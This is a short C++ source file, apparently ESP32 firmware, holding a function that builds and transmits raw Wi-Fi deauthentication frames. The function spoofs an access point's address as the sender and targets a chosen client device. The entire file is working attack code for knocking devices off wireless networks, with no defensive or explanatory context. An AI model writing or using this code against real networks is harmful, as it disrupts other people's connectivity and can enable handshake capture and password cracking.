#include "deauth.h"
#include "esp_wifi.h"
#include <cstring>

void module::deauth::send_frame(const uint8_t* bssid, const uint8_t* target_mac, uint16_t reason) {
    deauth_frame_t frame;

    memcpy(frame.da, target_mac, 6);
    memcpy(frame.sa, bssid, 6);
    memcpy(frame.bssid, bssid, 6);

    frame.reason[0] = reason & 0xFF;
    frame.reason[1] = (reason >> 8) & 0xFF;

    esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
}
